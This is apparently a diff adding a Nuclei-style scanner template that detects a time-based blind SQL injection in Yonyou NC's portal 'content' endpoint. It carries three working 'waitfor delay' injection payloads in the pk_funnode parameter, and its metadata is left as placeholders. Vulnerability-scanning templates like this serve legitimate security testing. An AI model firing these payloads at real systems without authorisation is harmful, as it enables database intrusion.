@@ -1,0 +1,24 @@
+id: yongyou-nc-content-sqli
+
+info:
+  name: Template Name
+  author: wangzong
+  severity: high
+  description: 用友NC 注入
+  reference:
+    - https://
+  tags: tags
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/portal/pt/link/content?pageId=login&pk_funnode=1';waitfor%20delay%20'0:0:3'--&pk_menuitem=2&pageModule=3&pageName=4"
+      - "{{BaseURL}}/portal/pt/link/content?pageId=login&pk_funnode=1';waitfor%20delay%20'0:0:6'--&pk_menuitem=2&pageModule=3&pageName=4"
+      - "{{BaseURL}}/portal/pt/link/content?pageId=login&pk_funnode=1';waitfor%20delay%20'0:0:9'--&pk_menuitem=2&pageModule=3&pageName=4"
+    matchers:
+      - type: dsl
+        condition: and
+        dsl:
+          - "duration_1>=3  && duration_1<=6"
+          - "duration_2>=6  && duration_2<=9"
+          - "duration_3>=9  && duration_3<=12"
